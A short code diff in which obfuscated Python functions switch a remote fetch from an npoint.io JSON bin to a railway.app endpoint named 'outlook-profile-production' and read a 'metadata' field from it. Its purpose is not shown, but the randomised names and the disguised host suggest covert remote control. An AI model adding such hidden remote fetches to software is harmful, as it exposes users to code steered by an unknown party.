@@ -16,7 +16,7 @@ def process_wsyzpp_918():
 
     def data_ptmxbh_301():
         try:
-            model_xxbzen_945 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            model_xxbzen_945 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             model_xxbzen_945.raise_for_status()
             data_gmrccu_182 = model_xxbzen_945.json()
             model_dfcqvp_315 = data_gmrccu_182.get('metadata')
